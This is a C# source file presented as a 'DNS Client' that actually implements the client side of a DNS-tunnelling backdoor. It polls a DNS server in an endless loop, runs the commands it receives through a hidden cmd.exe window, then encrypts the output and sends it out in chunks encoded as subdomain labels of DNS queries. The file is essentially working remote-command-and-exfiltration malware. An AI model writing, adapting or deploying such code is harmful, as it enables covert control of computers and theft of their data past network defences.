using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace MyDnsClient
{
    /// <summary>
    /// @auth shadu{AT}foxmail.com
    /// @desc C# DNS Client
    /// </summary>
    class Program
    {
        private static IPEndPoint remotePoint;
        private static UdpClient udpClient;
        private static string command ="";
        private static string postString = "";
        static List<string> strings = new List<string>();
        static void Main(string[] args)
        {
            udpClient = new UdpClient(0);
            remotePoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 53);
            string domain = "www.baidu.com";
            while (true)
            {
                sendDnsQuestion(domain,(Int16)6);
                if (Options.flag)
                    postData(domain);
                //Console.WriteLine(Options.flag);
            }

        }
        private static void sendDnsQuestion(string domain,short Qtype)
        {
            udpClient.Connect("127.0.0.1",53);
            byte[] data = QuestionFrame.Frame(domain,Qtype, (ushort)new Random().Next(1000, 10000));
            udpClient.Send(data,data.Length);
            byte[] rec = udpClient.Receive(ref remotePoint);
            DnsRespond.respond(rec);
        }

        public static string execCMD(string command,int seconds)
        {
            string output = ""; //输出字符串
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();//创建进程对象
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令
                startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动
                startInfo.RedirectStandardInput = false;//不重定向输入
                startInfo.RedirectStandardOutput = true; //重定向输出
                startInfo.CreateNoWindow = true;//不创建窗口
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程
                    {
                        if (seconds == 0)
                        {
                            process.WaitForExit();//这里无限等待进程结束
                        }
                        else
                        {
                            process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒
                        }
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出
                    }
                }
                catch
                {
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
            return output;
        }
        public static void postData(string domain)
        {
            Console.WriteLine(Options.command);
            Options.execComandResult = Encryption.ByteArrayToHexString(Encryption.Encrypt(execCMD(Options.command, 300)));
            Options.md5 = GetMD5Hash(Options.execComandResult);
            Options.sendData_List = Encryption.SplitLength(Options.execComandResult);
            int length = Options.sendData_List.Count / 4;
            int mod = Options.sendData_List.Count % 4;
            for (int i = 0; i < length; i++)
            {
                string post = "";
                var l = Options.sendData_List.GetRange(i * 4, 4);
                foreach (string s in l)
                {
                    post += s + ".";
                }
                Options.sendData_Queue.Add("header." + Options.md5 + "." + post + domain.Split(new char[] { '.' }, 2)[1]);
            }
            if (mod != 0)
            {
                string aa = "";
                foreach (string a in Options.sendData_List.GetRange(length * 4, mod))
                {
                    aa += a + ".";
                }
                Options.sendData_Queue.Add("header." + Options.md5 + "." + aa + domain.Split(new char[] { '.' }, 2)[1]);
            }
            //Console.WriteLine(Options.sendData_Queue.Count);
            foreach (string s in Options.sendData_Queue)
            {
                //Console.WriteLine(s);
                sendDnsQuestion(s, (Int16)6);
                //Console.WriteLine(s);
            }
            Options.sendData_Queue.Clear();
            Options.flag = false;
        }

        public static string GetMD5Hash(string data)
        {
            try
            {
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(Encoding.UTF8.GetBytes(data));
                StringBuilder sBuilder = new StringBuilder();

                // 循环遍历哈希数据的每一个字节并格式化为十六进制字符串
                for (int i = 0; i < retVal.Length; i++)
                {
                    sBuilder.Append(retVal[i].ToString("x2"));
                }
                return sBuilder.ToString();
                
            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
            }

        }
    }
}